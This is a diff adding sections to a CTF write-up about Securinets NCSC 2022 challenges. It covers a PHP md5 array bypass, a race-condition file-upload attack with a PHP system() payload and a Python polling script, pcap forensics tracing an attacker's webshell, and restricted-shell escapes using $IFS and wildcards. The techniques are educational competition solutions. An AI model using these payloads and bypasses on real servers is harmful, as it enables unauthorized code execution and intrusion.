@@ -274,4 +274,155 @@ I've participated in the CTF with [Aziz Zribi](https://www.facebook.com/Aziz.Zri
     Second, we compare `b` & `c` (strict comparison) therefor, both of their types must match. Also, their MD5 hash must be equal. We can abuse the `md5` function by sending `b` & `c` as an array, which will return null for both & throw a warning.
       
     Finally, we can use the following parameters `a={"key":0}&b[]=a&c[]=b` & get our flag: ` Securinets{Th1S_1s_t00_w3iRd!!!}`
+      
+  #### 5. Race Uploader
+      
+    For this one, we get this page
+
+    <p align="center">
+      <img src="/2022/NCSC/img/race.png"><br/>
+    </p>
+      
+    And we get the source code
+
+    <details>
+    <summary>Show</summary>
+
+    ```php
+    <?php
+    $is_upload = false;
+    $msg = null;
+    define("UPLOAD_PATH","/var/www/html/uploads");
+    if(isset($_POST['submit'])){
+      if ($_FILES['image']["size"] > 500000){
+          die("Tooo large");
+      }
+      $ext_arr = array('jpg','png','gif');
+      $file_name = $_FILES['image']['name'];
+      $temp_file = $_FILES['image']['tmp_name'];
+      $file_ext = substr($file_name,-3);
+      $upload_file = UPLOAD_PATH . '/' . $file_name;
+
+      if(move_uploaded_file($temp_file, $upload_file)){
+
+          if(in_array($file_ext,$ext_arr)){
+               $img_path = UPLOAD_PATH . '/'. md5(rand(1, 1000)).".".$file_ext;
+               rename($upload_file, $img_path);
+               echo "file was uploaded successfully";
+               die();
+          }else{   
+              unlink($upload_file);
+              echo "Your file was deleted !"."<br>";
+              die("Only jpg,png and gif files are allowed");
+          }
+      }else{
+          die('an Error has occured !!');
+      }
+    }
+    ?>
+    ```
+    </details>
+      
+    So what are we doing here? We upload a file, the file is moved to `/uploads`, we check the file extension, if it's an image we rename the file with a random name (`md5(rand(1,1000))`) else we'll be deleting the file. What's the problem here? The file is moved to an accessible location before verifying whether it'll be authorized or no & that'll be our attack vector. Code gets executed instruction after an other so if we are fast enough (& lucky enough), we can access the uploaded file before it's deleted, no matter what type it's! We were told that the flag is in `/flag` so we can make a php file with the following
+      
+    ```php
+    <?php
+      echo system('cat /ls');
+    ?>
+    ```
+      
+    We'll name that `payload.php`. We'll be using a python script for this time race which is the following
     
+    ```python
+    import requests
+      
+    while True:
+      r = requests.get('http://20.119.58.135:567/uploads/payload.php')
+      if r.status_code == 200:
+        print(r.content)
+        break
+    ```
+      
+    And we run that & upload our `payload.php` to get our flag:
+      
+    <p align="center">
+      <img src="/2022/NCSC/img/raceflag.png"><br/>
+    </p>
+      
+* ### Forensics
+  #### 1.  Attack01
+    
+    We didn't solve this challenge because we had the last part of the flag missing but it's worth to mention this one. We get a .pcap file & we were told that we need to track an attacker. The flag contained 3 parts:
+    
+    ```
+    1- Country and vpn company used?  country:vpncompany:ipaddress
+
+    2- Name of the executable that was uploaded onto the server? 
+
+    3- What was the message that the hacker left on the server and file that they saved that message to? message:file
+    ```
+      
+    Opening the capture file using wireshark & going throught the requests, we can notice the following:
+      
+    <p align="center">
+      <img src="/2022/NCSC/img/attack01_1.png"><br/>
+    </p>
+      
+    We can see in the picture above that IP `5.8.16.237` is using somekind of a dict attack to find files in the server. If we dig more, we'll find this:
+    
+    <p align="center">
+      <img src="/2022/NCSC/img/attack01_2.png"><br/>
+    </p>
+      
+    That's a webshell, this is definitely our attacker! We got the IP `5.8.16.237` & a quick IP lookup gives us the following
+      
+    ```
+    IP: 5.8.16.237
+    Organization: EstNOC
+    Country: Russia
+    ```
+    If we dig more into this, we'll find a POST request to the webshell that contains a binary file:
+      
+    <p align="center">
+      <img src="/2022/NCSC/img/attack01_3.png"><br/>
+    </p>
+    
+    We get the binary name! `hickityhackityOWO.exe`
+      
+    And that was all, we couldn't find the last detail.
+    
+* ### Misc
+  #### 1. Jail
+    In this challenge, we were given an ssh command to connect to a server, we were given a limited shell, we only had these characters authorized: `atlfsc$IFS?`
+      
+    If you try any other character, you'll be disconnected from the server.
+      
+    If we try `ls`, we get `flag.txt` but how can we get the content of it using only the whitelisted set of keys? Digging into this in google helped in knowing that space character can be replaced with `$IFS`, we have our `cat` command authorized & we have the one-character wildcard `?`. As a start I went for `cat$IFSfla??t?t` but for some reason, this didn't work. All I had to do was replace the whole `flag.txt` with `?`.
+      
+    Final command: `cat$IFS????????`<br/>
+    Flag: `Securinets{94fd7d4d85b75d948eadca7414826e2a}`
+      
+  #### 2. Prison Break
+    Similar to Jail but more limited in characters, we only have `()<?$` now. So when I was trying some random commands in my terminal, I landed on this: `<filename`, if you try that on a file, you'll get the following:
+
+    <p align="center">
+      <img src="/2022/NCSC/img/prison1.png"><br/>
+    </p>
+
+    This can be of use, but if we try that in our shell we don't get anything, we are one step closer. Now, how can we get the content to be printed in our screen? In shell, we can use `$(cmd)` in order to execute a command, so what if we pass the content of our file as a command? 
+
+    <p align="center">
+      <img src="/2022/NCSC/img/prison2.png"><br/>
+    </p>
+    
+    We get our flag!
+
+<br/>
+<hr/>
+
+## Conclusion
+
+Despite being tired, I was too excited to keep going & I was able to play till the end of the CTF considering this as my first time to attend this congress. A special thanks to Securinets for hosting such an event, to the organization staff & a more special one to the technical team for making such great challenges & being there to provide support. Finally, I would like to thank my team for doing their best & for enjoying our stay during the event.
+
+I'll be looking forward for NCSC 4.0!
+      
